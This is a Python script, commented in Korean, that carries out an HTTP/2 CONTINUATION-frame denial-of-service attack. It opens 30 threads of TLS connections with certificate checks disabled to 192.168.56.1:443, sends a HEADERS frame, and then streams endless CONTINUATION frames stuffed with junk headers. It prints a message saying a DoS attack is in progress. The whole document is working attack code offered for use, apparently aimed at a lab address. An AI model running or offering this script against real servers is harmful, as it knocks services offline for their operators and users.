from hpack import Encoder
import threading
from hyperframe.frame import HeadersFrame, ContinuationFrame, SettingsFrame, WindowUpdateFrame
import socket
import ssl
from multiprocessing import Process, current_process

# hpack을 사용하여 header 크기 압축
def hpack_header(i):
    encoder = Encoder()
    name = f'ssssssssssssssssssssshhhhhhhhhhhhhhhhhhhhhhhwwwwwwwwwwwwwwwwwshwshwssssssssshhhhhhhhhhhwwwwwwwwwwww{i}'
    value = f'03310331033198989803319898033198980331998980331033103310331989898033198980331989803319989803319898{i}'

    headers = [(name, value)]
    encoded_headers = encoder.encode(headers)
    return encoded_headers

def send_http2_request(host, port, use_ssl):
    # TCP 연결 설정
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    # localhost 인증서 검증 무시
    if use_ssl:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = context.wrap_socket(sock, server_hostname=host)

    # HTTP/2 연결 설정
    settings_frame = SettingsFrame(0)
    window_update_frame = WindowUpdateFrame(0)
    window_update_frame.window_increment = 65535

    # HTTP/2 프레임 전송
    sock.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n' + settings_frame.serialize() + window_update_frame.serialize())

    headers_frame = HeadersFrame(1)
    headers_frame.data = b'\x82\x86\x41\x86\xa0\xe4\x1d\x13\x9d\x09\x84\x7a\x88\x25\xb6\x50\xc3\xcb\xb8\xb8\x3f\x53\x03\x2a\x2f\x2a'
    headers_frame.flags.add('END_HEADERS')

    sock.sendall(headers_frame.serialize())

    # HTTP/2 프레임 반복 생성
    i = 0
    while True:
        continuation_frame = ContinuationFrame(1)
        continuation_frame.data = hpack_header(i)
        continuation_frame.flags.add('END_HEADERS')
        sock.sendall(continuation_frame.serialize())
        i += 1

def thread_send(host, port, use_ssl):
    while True:
        try:
            send_http2_request(host, port, use_ssl)
            print('Dos 공격 진행 중...')
        except Exception as e:
            print(f"Error: {e}")

def main():
    host = '192.168.56.1'
    port = 443
    use_ssl = True
    num_threads = 30

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=thread_send, args=(host, port, use_ssl), name=f'Process-{i}')
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
